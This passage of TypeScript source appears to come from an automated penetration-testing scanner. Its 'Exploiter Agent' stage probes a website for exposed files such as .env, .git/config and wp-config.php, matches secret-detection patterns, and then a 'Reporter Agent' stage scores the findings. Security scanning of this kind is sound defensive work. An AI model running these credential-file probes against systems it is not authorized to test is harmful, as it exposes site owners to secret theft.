  }));
  if (adminFound.length > 0) {
    log('Exploiter Agent', `Admin panels accessible without auth: ${adminFound.join(', ')}`);
    findings.push({ severity: 'high', title: `Admin Panels Publicly Accessible: ${adminFound.join(', ')}` });
  } else {
    log('Exploiter Agent', 'Admin panel discovery: no publicly accessible panels found');
  }

  // 2s. Sensitive file and error disclosure
  log('Exploiter Agent', 'Probing for exposed configuration files and verbose error responses...');
  const sensitivePaths = [
    `${origin}/.env`,
    `${origin}/.git/config`,
    `${origin}/config.json`,
    `${origin}/package.json`,
    `${origin}/.DS_Store`,
    `${origin}/wp-config.php`,
    `${origin}/database.yml`,
    `${origin}/server.js`,
  ];
  interface SensitivePattern { re: RegExp; label: string; sev: FindingEntry['severity'] }
  const sensitivePatterns: SensitivePattern[] = [
    { re: /DB_PASSWORD|DATABASE_URL|SECRET_KEY|API_KEY|PRIVATE_KEY|AWS_SECRET/i, label: '.env secrets exposed', sev: 'critical' },
    { re: /\[core\][\s\S]{0,200}repositoryformatversion/i, label: '.git/config leaked', sev: 'high' },
    { re: /password\s*=\s*\S+/i, label: 'plaintext password in config', sev: 'high' },
    { re: /"dependencies"\s*:\s*\{/i, label: 'package.json exposed (tech fingerprint)', sev: 'medium' },
    { re: /at\s+\w[\w.]+\s*\(.*:\d+:\d+\)/i, label: 'stack trace in error response', sev: 'medium' },
    { re: /Traceback \(most recent call last\)/i, label: 'Python traceback', sev: 'medium' },
    { re: /PHP Fatal error|PHP Warning:/i, label: 'PHP verbose error', sev: 'medium' },
    { re: /define\s*\(\s*['"]DB_PASSWORD['"]/i, label: 'wp-config.php database credentials', sev: 'critical' },
  ];
  const disclosureResults = await Promise.all(sensitivePaths.map(p => httpProbe(p)));
  const foundDisclosures = new Set<string>();
  for (let i = 0; i < sensitivePaths.length; i++) {
    const dr = disclosureResults[i];
    if (!dr || dr.status !== 200 || dr.body.length < 20) continue;
    for (const { re, label, sev } of sensitivePatterns) {
      if (re.test(dr.body) && !foundDisclosures.has(label)) {
        foundDisclosures.add(label);
        const shortPath = sensitivePaths[i].replace(origin, '');
        log('Exploiter Agent', `Sensitive disclosure: ${label} at ${shortPath}`);
        findings.push({ severity: sev, title: `Exposed File: ${label} (${shortPath})` });
      }
    }
  }
  if (foundDisclosures.size === 0) log('Exploiter Agent', 'Sensitive file disclosure: no exposed config files or verbose errors detected');

  // ==========================================================
  // STAGE 3: REPORTER AGENT — COMPILE RESULTS
  // ==========================================================

  log('Reporter Agent', `Pentest session complete. Compiling ${findings.length} confirmed finding${findings.length !== 1 ? 's' : ''}...`);

  const bySev = {
    critical: findings.filter(f => f.severity === 'critical'),
    high: findings.filter(f => f.severity === 'high'),
    medium: findings.filter(f => f.severity === 'medium'),
    low: findings.filter(f => f.severity === 'low'),
  };

  if (bySev.critical.length > 0) {
    log('Reporter Agent', `[CRITICAL ×${bySev.critical.length}] ${bySev.critical.map(f => f.title).join(' | ')}`);
  }
  if (bySev.high.length > 0) {
    log('Reporter Agent', `[HIGH ×${bySev.high.length}] ${bySev.high.map(f => f.title).join(' | ')}`);
  }
  if (bySev.medium.length > 0) {
    log('Reporter Agent', `[MEDIUM ×${bySev.medium.length}] ${bySev.medium.map(f => f.title).join(' | ')}`);
  }
  if (bySev.low.length > 0) {
    log('Reporter Agent', `[LOW ×${bySev.low.length}] ${bySev.low.map(f => f.title).join(' | ')}`);
  }
  if (findings.length === 0) {
    log('Reporter Agent', 'No confirmed exploitable vulnerabilities detected. Strong baseline security posture observed.');
  }

  const riskScore = Math.max(10, 100 - bySev.critical.length * 30 - bySev.high.length * 15 - bySev.medium.length * 5 - bySev.low.length * 2);
  const riskLevel = bySev.critical.length > 0 ? 'CRITICAL' : bySev.high.length > 0 ? 'HIGH' : bySev.medium.length > 0 ? 'MEDIUM' : 'LOW';
  log('Reporter Agent', `Risk rating: ${riskLevel} | Posture score: ${riskScore}/100 | Session artifacts archived`);

  return logs;
}
